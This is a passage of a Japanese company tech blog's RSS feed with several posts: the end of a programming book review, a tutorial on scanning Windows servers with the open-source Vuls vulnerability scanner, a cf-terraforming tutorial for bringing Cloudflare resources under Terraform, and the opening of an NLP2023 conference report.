どのプログラミング言語を学ぶべきか」の最後のほうにも記載していますが、ライブラリーやフレームワークの使い方を知ることに重点を置くものが増えています。そのため、ここでは、言語自体の機能なのか、ライブラリーの機能なのかを意識する必要があるとのことです。</p><p>おすすめは、前述にもありましたが<a href="https://atcoder.jp/?lang=ja">AtCoder</a>です。ABCと呼ばれるAtCoder Beginner Contestの簡単な問題が多くあり、言語用法を問うような問題が多く有り、ブラウザ上の実行環境でプログラムを動作させ正否の判定できるため、初学者がプログラミング言語を勉強するのにおすすめです。さらに習熟度が上がった後もより難しいアルゴリズム問題などを解きたい場合にも有用です。</p><blockquote><p>何かを作る……たくさんの何かを</p></blockquote><p>小さなアプリケーションを言語の機能のみを使って作成することで、言語に対する習熟度の向上や、やりたいことを言語の機能でどのように実現するかマッピング能力を向上させます。本ではいくつか例題がありますが、先輩に教わったおすすめはToDoアプリです。追加、変更、削除とよくある機能を実装ができるのでおすすめです。</p><h2 id="おまけ-就職も視野に入れた人向けのコンテンツ"><a href="#おまけ-就職も視野に入れた人向けのコンテンツ" class="headerlink" title="おまけ(就職も視野に入れた人向けのコンテンツ)"></a>おまけ(就職も視野に入れた人向けのコンテンツ)</h2><p>この記事では、就職した人をターゲットにと思い記載しています。書きたい内容から逸れそうな部分は割愛していますが、コーディングブートキャンプや独学のメリットやデメリットは参考になるため、おまけとして簡単にまとめておきます。</p><p>ソフトウェア開発者としてスタートするための3種類の戦略、経路について、以下の3つの章で述べられています。</p><ul><li>第7章 大学の活用</li><li>第8章 コーディングブートキャンプ</li><li>第9章 独学</li></ul><div class="scroll"><table><thead><tr><th align="left">戦略</th><th align="left">知識</th><th align="left">時間</th><th align="left">お金</th></tr></thead><tbody><tr><td align="left">大学の活用</td><td align="left">体系立った学び、コンピューターサイエンスの基礎知識の修得(仕事現場のリアルからは古い可能性あり)</td><td align="left">長期間</td><td align="left">高い</td></tr><tr><td align="left">コーディングブートキャンプ(オンラインスクールなど)</td><td align="left">分野を絞り実社会寄りの知識修得(コンピューターサイエンスの知識の一部に穴が開く)</td><td align="left">大学に比べ非常に短い期間(数時間から数日のものが日本には多め)</td><td align="left">低い</td></tr><tr><td align="left">独学</td><td align="left">関心のあることに集中(学ぶ対象は自分で決める必要があり、これまでの選択肢の中で一番知識に穴が空きやすい)</td><td align="left">自分のペース(自分に合ったペースで進められるがやる気に左右されてしまう)</td><td align="left">低コスト、または、コストなし</td></tr></tbody></table></div><h2 id="最後に"><a href="#最後に" class="headerlink" title="最後に"></a>最後に</h2><p>以上が、私が新人の時に出会いたかった本で、ご紹介したい部分の抜粋です。他にも初心者向けの中でも割愛した部分も多くあり、また、経験者向けの情報もあるため、気になった方は見てみていただければです。。</p><p>本書「第53章 ブログの作り方」では、<code>大切なのは、人々がシェアしたりリンクしたりしたくなるいいコンテンツを作ることだ。</code> と書かれておりますが近道はないともあり、改めてブログを書くのは難しいと認識させられました……たくさん書いて行きます。</p><p>なお、この著書の「最後に」は第60章になります。かなり長いように感じますが、目次を見て拾い読みすることを推奨している本のため、気負わずパラパラと眺めてみてください。</p><p>次は佐藤更星さんの<a href="/articles/20230509a/">AWS Application Composerを使ってみた！</a>です！</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Culture/">Culture</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%85%A5%E9%96%80/">入門</category>
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85%E5%90%91%E3%81%91/">初心者向け</category>
      
      <category domain="https://future-architect.github.io/tags/%E6%9B%B8%E8%A9%95/">書評</category>
      
      
      <comments>https://future-architect.github.io/articles/20230508b/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>5分でできる。Windowsの脆弱性を「Vuls」で今すぐチェック！</title>
      <link>https://future-architect.github.io/articles/20230508a/</link>
      <guid>https://future-architect.github.io/articles/20230508a/</guid>
      <pubDate>Sun, 07 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;こんにちは。ペンギンになりたい見習いエンジニア、島ノ江です。&lt;/p&gt;
&lt;p&gt;現在は&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>こんにちは。ペンギンになりたい見習いエンジニア、島ノ江です。</p><p>現在は<a href="https://vuls.biz/">FutureVuls</a>という脆弱性管理クラウドサービスで、開発とサポートなどを担当しています。</p><p>未だよちよち歩きの新米ですが、今回は弊チームがOSSとして公開しメンテナンスしている「Vuls」の新機能についてご紹介させていただきたいと思います。</p><h3 id="脆弱性とその検知"><a href="#脆弱性とその検知" class="headerlink" title="脆弱性とその検知"></a>脆弱性とその検知</h3><p>皆さんは、自社が保有するサーバやソフトウェアに脆弱性がないかどうか、どのようにチェックしていますか？脆弱性を放置したまま運用すると、サイバー攻撃により企業に大きな損害をもたらす恐れがあるため、対策を講じることが不可欠です。</p><p>しかし、人間が情報収集から影響調査までを手動で行う脆弱性対応には、膨大な作業量と苦痛と絶望感が伴います。</p><p>そこで我々が提供するVulsが登場します。</p><p><a href="https://github.com/future-architect/vuls">Vuls</a>は、各種OVALやSecurityTrackerなどの情報、NVDやJVNなどの公開されている脆弱性情報をデータベース化し、サーバやソフトウェアの脆弱性を自動検知するツールです。</p><p>また、商用版の継続的脆弱性管理クラウドサービスである<a href="https://vuls.biz/">FutureVuls</a>では、検知した脆弱性の自動リスク判定やチケット機能による差分管理機能などを提供しており、脆弱性管理の一連の作業を自動化できます。</p><p>1万 GitHub Star目前！</p><img src="/images/20230508a/vuls.png" alt="" loading="lazy"><p>そんな便利ツールのVulsですが、これまではWindowsはサポートしていませんでした。</p><p>米国の行政機関CISA(Cybersecurity &amp; Infrastructure Security Agency)の<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-117a">報告</a>によると、2021年に頻繁にサイバー攻撃に利用された注意すべき脆弱性上位 15位のなかでWindowsのものは半数を超えています。 そして、Windowsのアップデートや脆弱性の管理は特に重点的に行う必要があるものの、継続的にメンテナンスされているOSSのWindows用脆弱性スキャナはごく少数なのが現状です。</p><p>「クッ、やはりWindowsの脆弱性検知は商用版を買うしかないのか…これがOSSの限界か…」と悩んでいたそんなあなたに朗報です！</p><p>これまでクラウドサービス版向けに提供されていた、Windowsスキャン機能が移植され、OSSのVulsでもWindowsをスキャンできるようになりました。</p><p>参考）<a href="https://prtimes.jp/main/html/rd/p/000000623.000004374.html">継続的脆弱性管理サービス「FutureVuls」Windowsのための脆弱性スキャナをOSS化</a></p><p>この新機能を紹介するため、今回の記事ではWindowsサーバのスキャンを試していきます！</p><h2 id="WindowsサーバでVulsの脆弱性スキャンを試す"><a href="#WindowsサーバでVulsの脆弱性スキャンを試す" class="headerlink" title="WindowsサーバでVulsの脆弱性スキャンを試す"></a>WindowsサーバでVulsの脆弱性スキャンを試す</h2><p>実際にWindowsサーバにVulsの実行環境を作成して、サーバスキャンをやってみようと思います。</p><p>今回は筆者の自宅にあったWindows Server 2012を対象としています。</p><p>実行手順は以下の通りです：</p><ol><li>スキャンをするvuls、脆弱性データベースを作成するgostの実行ファイルをそれぞれ取得する。</li><li>gostを実行して、Windowsで検知するためのDBを作成する</li><li><code>vuls.exe scan</code>, <code>vuls.exe report</code>により検知を実行、結果を確認する。</li></ol><p>たったのこれだけで脆弱性の検知ができます、簡単ですね！<br>以下で実際の作業手順を見ていきます。</p><h3 id="実行ファイルの取得"><a href="#実行ファイルの取得" class="headerlink" title="実行ファイルの取得"></a>実行ファイルの取得</h3><p>GitHubレポジトリから自分の環境に併せて実行ファイルをダウンロードします。</p><ul><li>vuls：<a href="https://github.com/future-architect/vuls/releases">こちら</a>から最新バージョンのvuls実行ファイルを選択</li><li>gost：<a href="https://github.com/vulsio/gost/releases">こちら</a>から最新バージョンのgost実行ファイルを選択</li></ul><h3 id="検知用の脆弱性データベースの作成"><a href="#検知用の脆弱性データベースの作成" class="headerlink" title="検知用の脆弱性データベースの作成"></a>検知用の脆弱性データベースの作成</h3><p>次にWindowsで検知するためのデータベースをローカルに作成します。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gost.exe fetch microsoft</span><br></pre></td></tr></table></figure><p>その後、スキャン用の設定ファイル（config.toml）を作成して、ここで作成したデータベースへのパスを定義します。（以下のsqlite3Pathの部分を各自の環境に併せてください）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.toml の内容</span></span><br><span class="line"><span class="section">[gost]</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;sqlite3&quot;</span></span><br><span class="line"><span class="attr">sqlite3Path</span> =  <span class="string">&quot;C:\\Users\\User\\vuls\\gost.sqlite3&quot;</span>  <span class="comment"># ここを編集</span></span><br><span class="line"><span class="section">[servers]</span></span><br><span class="line"><span class="section">[servers.localhost]</span></span><br><span class="line"><span class="attr">host</span> = <span class="string">&quot;localhost&quot;</span></span><br><span class="line"><span class="attr">port</span> = <span class="string">&quot;local&quot;</span></span><br></pre></td></tr></table></figure><h3 id="スキャンとレポートを実行する"><a href="#スキャンとレポートを実行する" class="headerlink" title="スキャンとレポートを実行する"></a>スキャンとレポートを実行する</h3><p>以上でWindowsスキャンの準備が完了したので、スキャンを実行します。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuls.exe scan</span><br></pre></td></tr></table></figure><p>最終的なスキャン結果が表示されます。</p><p>検出した脆弱性の一覧を表示してみましょう。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuls.exe report</span><br></pre></td></tr></table></figure><img src="/images/20230508a/vuls_report.png" alt="" loading="lazy"><p>自分のサーバで見つかった脆弱性と、それらのCVSSスコアなどが表形式で表示されました。</p><p>WindowsのアップデートはKBという単位で提供されていますが、インターネットの情報ではKBとCVSSスコアなどを関連付けるのが手間でした。Vulsを使うと、未適用なKBに含まれる脆弱性をCVEに展開してくれて、さらにそのCVSSを表示してくれるので対応有無を判断しやすくなります。</p><p>なお、評価が0.0や？になっているものは、CVSSスコアが設定されていないものです。</p><p>通常の煩雑な脆弱性検知のプロセスを、簡単な導入手順で自動化することができるのは楽ですね！最終的な出力結果も表形式になっていてとても見やすいです。</p><h2 id="まとめ：脆弱性スキャナといえばVulsでしょ"><a href="#まとめ：脆弱性スキャナといえばVulsでしょ" class="headerlink" title="まとめ：脆弱性スキャナといえばVulsでしょ"></a>まとめ：脆弱性スキャナといえばVulsでしょ</h2><p>Vulsのスキャナは、どなたでも無償で利用できるオープンソースのツールです。</p><p>今回はWindowsスキャンについて紹介しましたが、Vulsは様々なOSに対応しています。脆弱性検知のツールの１つとして是非ご活用ください。</p><p>ただし、脆弱性は見つけるだけでは意味がありません。リスクに応じて適切に対応するまでが脆弱性対応です。クラウド版の<a href="https://vuls.biz/">FutureVuls</a>では、Vulsで検知した脆弱性の対応優先度の自動判断から解消までのサポートを提供しています。</p><p>以上でOSSのVulsで行うWindowsスキャンの紹介を終えたいと思います。</p><p>良ければいいね・ツイートなどで共有をお願いします！</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://future-architect.github.io/tags/Vuls/">Vuls</category>
      
      <category domain="https://future-architect.github.io/tags/OSS/">OSS</category>
      
      <category domain="https://future-architect.github.io/tags/Security/">Security</category>
      
      
      <comments>https://future-architect.github.io/articles/20230508a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>cf-terraformingで入門するCloudflare</title>
      <link>https://future-architect.github.io/articles/20230502a/</link>
      <guid>https://future-architect.github.io/articles/20230502a/</guid>
      <pubDate>Mon, 01 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;p&gt;こんにちは。TIGの伊藤太斉です。この記事は&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>こんにちは。TIGの伊藤太斉です。この記事は<a href="/articles/20230417a">春の入門連載2023</a>の12(11)日目です。</p><p>先日、Cloudflareの勉強会に参加してきて、これまで名前しか知らなかったものが少し知ることができてとワクワクしている最近です。そして、春の入門連載に今年も参加しているので、せっかくならCloudflareを記事にしつつ、理解を深めていこうと思います。</p><p>いきなりCloudflareのサービスに入門するよりは、自分の分野であるTerraformからCloudflareに入門します。</p><p>Cloudflare Workersについては、小澤さんの<a href="/articles/20230427a">CDN 入門とエッジでのアプリケーション実行</a>でも触れているので合わせてご覧になってください。</p><h2 id="CloudflareとTerraform"><a href="#CloudflareとTerraform" class="headerlink" title="CloudflareとTerraform"></a>CloudflareとTerraform</h2><p>Terraformは言わずもがな、Infrastructure as Code(IaC)を実現するためのツールとして知られています。そして、CloudflareについてもTerraformのProviderをCloudflareで開発しており、他のパブリッククラウドやサービスと同じようにTerraformで管理することができます。</p><p><a href="https://github.com/cloudflare/terraform-provider-cloudflare">https://github.com/cloudflare/terraform-provider-cloudflare</a></p><p>さて、このようにTerraform管理できることで、Cloudflareのリソースがどれだけあるか、どのように設定されているか見通しを良くすることができますが、一方で元々手動で作ってしまったリソースをTerraformの管理下とする場合、そもそも全量把握できているか、と不透明な状況になります。そこで、今回取り上げるcf-terraformingです。</p><h2 id="cf-terraformingによるIaC化"><a href="#cf-terraformingによるIaC化" class="headerlink" title="cf-terraformingによるIaC化"></a>cf-terraformingによるIaC化</h2><p>cf-terraformingは、Cloudflareにて開発されているOSSで、その名前の通り、Cloudflare上のリソースをHCL化し、出力されたソースを利用してTerraformのState管理下にすることができるツールです。利用準備も含めて、実際に見ていきましょう。</p><p><a href="https://github.com/cloudflare/cf-terraforming">https://github.com/cloudflare/cf-terraforming</a></p><p>また、類似のツールとして<a href="https://github.com/GoogleCloudPlatform/terraformer">terraformer</a>もあり、ソースの生成からStateの変更まで一括でできる点はメリットですが、Terraformのv1.x系のサポートがないため、importされたソースをアップデートする必要があります。</p><h3 id="利用準備"><a href="#利用準備" class="headerlink" title="利用準備"></a>利用準備</h3><p>はじめに環境構築をしましょう。今回はMac環境で進めていきます。前提としてHomebrewを利用できるようにしておきましょう。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Terraformのインストール</span></span><br><span class="line">$ brew tap hashicorp/tap</span><br><span class="line">$ brew install hashicorp/tap/terraform</span><br><span class="line"></span><br><span class="line"><span class="comment"># cf-terraformingのインストール</span></span><br><span class="line">$ brew tap cloudflare/cloudflare</span><br><span class="line">$ brew install --cask cloudflare/cloudflare/cf-terraforming</span><br></pre></td></tr></table></figure><p>CLIはこれで準備が完了したので、次にディレクトリ周りの準備です。<br>cf-terraformingを利用する際には事前にProviderが利用できる状態になっている必要があるので、以下のように任意のディレクトリを作成し、<code>provider.tf</code>を作成しておきましょう。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> cloudflare-terraform</span><br><span class="line">$ <span class="built_in">cd</span> cloudflare-terraform</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># provider.tf</span><br><span class="line">provider &quot;cloudflare&quot; &#123;&#125;</span><br></pre></td></tr></table></figure><p>上記のファイルを準備した上で、<code>terraform init</code>コマンドを実行しておきましょう。<br>また、環境変数周りの設定も必要になるので、</p><ul><li><code>CLOUDFLARE_API_TOKEN</code></li><li><code>CLOUDFLARE_API_KEY</code></li><li><code>CLOUDFLARE_EMAIL</code></li><li><code>CLOUDFLARE_ACCOUNT_ID</code></li></ul><p>の4つを使える状態にしておきましょう。私の場合には、以下のように<code>env</code>ファイルに記述して、利用できるようにしました。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># env</span></span><br><span class="line"><span class="built_in">export</span> CLOUDFLARE_API_TOKEN=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"><span class="built_in">export</span> CLOUDFLARE_API_KEY=yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</span><br><span class="line"><span class="built_in">export</span> CLOUDFLARE_EMAIL=user@sample.com</span><br><span class="line"><span class="built_in">export</span> CLOUDFLARE_ACCOUNT_ID=00000000000000000000000000</span><br></pre></td></tr></table></figure><p>これで、準備が整ったので、実際のリソースに対して実行しましょう。cf-terraformingには、<code>generate</code>と<code>import</code>の2つのコマンドがあります。ここからはそれぞれ使って、WorkersのKVを触ってみようと思います。名前は以下のように<code>SAMPLE_TF</code>としました。</p><img src="/images/20230502a/image.png" alt="image.png" width="825" height="502" loading="lazy"><h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><p>まずは、<code>generate</code>コマンドを使ってみます。Workers KVはAccount単位で利用するリソースであることと、事前に環境変数を利用できるようにしてあるので、 以下のワンラインを入力すると、それに対応したTerraformのコードが出力されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cf-terraforming generate --resource-type <span class="string">&quot;cloudflare_workers_kv_namespace&quot;</span></span><br><span class="line"></span><br><span class="line">resource <span class="string">&quot;cloudflare_workers_kv_namespace&quot;</span> <span class="string">&quot;terraform_managed_resource_xxxxxxxxxxxxxx&quot;</span> &#123;</span><br><span class="line">  account_id = <span class="string">&quot;00000000000000000000000000&quot;</span></span><br><span class="line">  title      = <span class="string">&quot;SAMPLE_TF&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上記で<a href="https://registry.terraform.io/providers/cloudflare/cloudflare/latest/docs/resources/workers_kv_namespace">cloudflare_workers_kv_namespace</a>に対応したリソースが作成されたことがわかりました。実際には、ファイルに記述して利用したいので、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cf-terraforming generate --resource-type <span class="string">&quot;cloudflare_workers_kv_namespace&quot;</span> &gt;&gt; workers_kv_namespace.tf</span><br></pre></td></tr></table></figure><p>のように利用するのが良さそうです。また、新規にWorkers KVを作成した場合(<code>SAMPLE_TF2</code>)とした場合には以下のような出力になるため、指定したTerraformのリソースに該当するリソースを全て出力してくれるようです。</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p><code>cf-terraforming generate</code>コマンドで出力したHCLを利用してState管理下にしていきましょう。<br>コマンドは、先ほど実行した<code>generate</code>を<code>import</code>に変えた形で、実行します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cf-terraforming import --resource-type <span class="string">&quot;cloudflare_workers_kv_namespace&quot;</span></span><br><span class="line"></span><br><span class="line">terraform import cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx xxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>このように<code>cf-terraforming import</code>コマンドでは「<code>terraform import</code>コマンドのワンライン」を出力してくれるようです。それでは、この出力されたコマンドを入力してみましょう。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ terraform import cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx xxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx: Importing from ID <span class="string">&quot;xxxxxxxxxxxxxx&quot;</span>...</span><br><span class="line">╷</span><br><span class="line">│ Error: invalid <span class="built_in">id</span> (<span class="string">&quot;xxxxxxxxxxxxxx&quot;</span>) specified, should be <span class="keyword">in</span> format <span class="string">&quot;accountID/namespaceID&quot;</span></span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">╵</span><br></pre></td></tr></table></figure><p>エラーになってしまいました。エラーの内容を読んでみると「<code>accountID/namespaceID</code>の形式でコマンドを実行してね」なので、上で入力したnamespaceIDの手前にaccountIDを差し込んで再度トライしたところ、成功しました。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ terraform import cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx 00000000000000000000000000/xxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx: Importing from ID <span class="string">&quot;00000000000000000000000000/xxxxxxxxxxxxxx&quot;</span>...</span><br><span class="line">cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx: Import prepared!</span><br><span class="line">  Prepared cloudflare_workers_kv_namespace <span class="keyword">for</span> import</span><br><span class="line">cloudflare_workers_kv_namespace.terraform_managed_resource_xxxxxxxxxxxxxx: Refreshing state... [<span class="built_in">id</span>=xxxxxxxxxxxxxx]</span><br><span class="line"></span><br><span class="line">Import successful!</span><br><span class="line"></span><br><span class="line">The resources that were imported are shown above. These resources are now <span class="keyword">in</span></span><br><span class="line">your Terraform state and will henceforth be managed by Terraform.</span><br></pre></td></tr></table></figure><p>無事にTerraformのStateに取り込むことができました。<code>import</code>コマンドも実際にはそのまま使うのではなく、シェルスクリプトなどに格納した上で使っていくのが良いのかと思いました。</p><h3 id="その他"><a href="#その他" class="headerlink" title="その他"></a>その他</h3><p>cf-terraformingは、公式の<a href="https://github.com/cloudflare/cf-terraforming#supported-resources">Supported Resources</a>に記載があるように、Cloudflareの全てのリソースに対して対応しているわけではありません。ただ、Terraformの管理下としたい場合の選択肢としては、Terraformが元来機能として有している<code>terraform import</code>コマンドもあり、ほとんどカバーすることが可能です。</p><h2 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h2><p>今回はcf-terraformingを通して、Cloudflareに触ってみました。generateコマンドでコードを生成し、importコマンドでStateの管理下にする、という流れでIaCへのハードルがすごく下がった印象でした。さまざまな言語を学ぶ時にはじめにぶつかる「どう書くんだっけ？」という疑問が減ることがこのツールの大きな意義と感じました。また、その他でも触れましたが、ツールとしてはまだ適用範囲(特に個人向けでサクッと使うリソース)がもっと広がるとより使いやすくなりそうです。</p><p>週明けの5&#x2F;8は齊藤さんの <a href="/articles/20230508b/">新人の時に出会いたかった本の紹介</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/IaC/">IaC</category>
      
      <category domain="https://future-architect.github.io/tags/Terraform/">Terraform</category>
      
      <category domain="https://future-architect.github.io/tags/Cloudflare/">Cloudflare</category>
      
      <category domain="https://future-architect.github.io/tags/cf-terraforming/">cf-terraforming</category>
      
      
      <comments>https://future-architect.github.io/articles/20230502a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>言語処理学会 (NLP2023) 参加報告</title>
      <link>https://future-architect.github.io/articles/20230501a/</link>
      <guid>https://future-architect.github.io/articles/20230501a/</guid>
      <pubDate>Sun, 30 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;みなさんこんにちは！フューチャー株式会社の藤井と申します。大学4年次より自然言語処理 (NLP)</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>みなさんこんにちは！フューチャー株式会社の藤井と申します。大学4年次より自然言語処理 (NLP) を専門とし、フューチャー入社以降はStrategic AI Group (SAIG) の一員として多種多様な業種・業界のお客様が抱える課題に対するAIの社会応用を推進しています。</p><p>さて、今回は遅ればせながら、2023年3月13日(月)〜3月17日(金)において沖縄県は宜野湾市で開催された<a href="https://www.anlp.jp/nlp2023/">言語処理学会第29回年次大会 (NLP2023)</a> に参加してきましたのでご報告いたします。</p><p>当社はゴールドスポンサーとして参加し、総勢8名、オンサイトでの聴講を行いました。</p><p>この記事では主に、SAIGから参加した5名より特に興味深かった発表・セッションを紹介していきたいと思います。どうぞよろしくお願いします！</p><img src="/images/20230501a/414EE21B-39AC-485D-9900-69EED8311105_1_105_c.jpeg" alt="414EE21B-39AC-485D-9900-69EED8311105_1_105_c.jpeg" width="1024" height="769" loading="lazy"><h2 id="言語処理学会とは"><a href="#言語処理学会とは" class="headerlink" title="言語処理学会とは"></a>言語処理学会とは</h2><p>言語処理学会は、自然言語処理（NLP）分野における国内最大の学会で毎年3月に開催されています。年次大会は今年で29回目を数え、発表件数、参加者数ともに右肩上がりで推移する勢いのある学会です。</p><p>近年は新型コロナウイルスの影響でオンライン開催でしたが、第29回大会では現地会場とオンラインのハイブリッド形式となり、国内の多くの自然言語処理研究者が一堂に会しました。口頭発表、ポスター発表に加え、近年ではワークショップも併設されNLPに関する幅広いトピックが活発に議論されています。</p><p>また、昨年11月に登場し、未だかつてないスピードで登録者1億人を突破するなど話題となったChatGPTの出現は本大会にも大きな衝撃を与えました。</p><p>大会2日目には緊急パネル「ChatGPTで自然言語処理は終わるのか」が企画されるなど “新たな” 自然言語処理に注目が集まっています。</p><h2 id="興味深かった発表・セッションの紹介"><a href="#興味深かった発表・セッションの紹介" class="headerlink" title="興味深かった発表・セッションの紹介"></a>興味深かった発表・セッションの紹介</h2><p>本セクションはSAIGから参加した5名のオムニバス形式でお送りします。</p><ul><li><strong><a href="https://www.anlp.jp/proceedings/annual_meeting/2023/pdf_dir/H5-2.pdf">[H5-2]</a> クエリ指向要約におけるクエリと要約の統合的な生成</strong><br>この研究では、文章の中からクエリに対する回答となる部分を要約して提示する「クエリ志向要約」タスクにおいて、クエリが未知のシチュエーションを想定し、クエリの候補とその要約を統合的に生成する「クエリ推薦付き要約」を提案しています。<br>手法自体はシンプルでOpenDomain QAに用いられるFusion-in-Decoderにおいて、クエリ生成・回答生成のシーンに応じた接頭辞を使い分け、クエリ→回答の順で生成を行うというものです (論文中では逆順や同時生成についても触れられています)。<br>実社会においては、例えば新たな製品を買ったとき、新たなプロジェクトに参加したときなど、そもそも何が書かれているのか分からない膨大なマニュアルに遭遇することが多々あります。<br>また、コールセンター業務などでも、リアルタイムに交わされる会話に基づいて、どのような質問があり、なんと答えたのかをその場で構造化された状態で閲覧できると高い業務削減効果を見込むことができると考えられます。<br>今後の課題としてあげられていたとおり、クエリ・要約作成時の処理単位など改善の余地はありますが、潜在ニーズが大きく今後の発展が期待できること、デモアプリとして動くものに落とし込む技術力を評価して挙げさせていただきました。 (藤井)</li><li><strong><a href="https://www.anlp.jp/proceedings/annual_meeting/2023/pdf_dir/H7-1.pdf">[H7-1]</a> 対話行為の分布を利用した雑談対話システムの評価指標</strong><br>この研究では、雑談システムの評価において、人手評価を含む多くの指標がシングルターンの対話に閉じていることに着目し、システムのふるまい全体の評価を目的とした新たな評価指標を提案しています。<br>Twitterのリプライチェーンから収集した人間の対話と、同様のデータでfine-tuningしたT5モデルによる生成結果に対話行為 (あいさつ、質問など各発話の役割) のアノテーションを付与し、人間がシステムに比べ多様な対話行為を使い分けていることや、人間の対話では相手の発言に応じて遷移しやすい対話行為があるのに対し、システムの対話には遷移の一貫性がないことを明らかにしました。<br>論文では上記の観測に基づき、対話行為のエントロピー (どれだけ多様か) および、相互情報量 (どれだけ決定的か) に基づく評価指標の有効性を検証しています。<br>対話行為と従来指標を相互に考慮した指標の提案や、人間の遷移パターンとの類似性を考慮することでさらなる発展が見込める話だと感じました。<br>また、人間とシステムの対話の違いを新たな観点から分析したことで、次に来るべき対話行為に誘導するようなインストラクションを与えるなど、より人間らしい対話の実現に向けた可能性も切り拓かれたと思います。 (藤井)</li><li><strong><a href="https://www.anlp.jp/proceedings/annual_meeting/2023/pdf_dir/H5-1.pdf">[H5-1]</a> 忠実性向上のためにn-gramの抽出性を報酬とする強化学習を用いる抽象型要約</strong><br>要約文生成タスクにおいて、原文書 (要約の元となる文書) 